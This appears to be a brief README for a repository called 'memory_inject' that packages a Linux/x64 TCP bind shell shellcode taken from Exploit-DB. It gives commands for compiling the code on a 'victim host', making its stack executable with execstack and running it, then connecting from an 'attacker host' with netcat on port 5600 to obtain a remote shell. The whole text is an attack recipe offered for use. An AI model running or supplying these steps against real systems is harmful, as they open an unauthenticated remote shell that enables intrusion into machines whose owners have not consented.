# memory_inject

Linux/x64 - Bind (5600/TCP) Shell Shellcode (87 bytes) 
https://www.exploit-db.com/exploits/41128

TCP bind shell

victim host =>
$ gcc -o bind_shell bind_shell.c
$ execstack -s bind_shell
$ ./bind_shell

attacker host =>
$ nc victim_host 5600
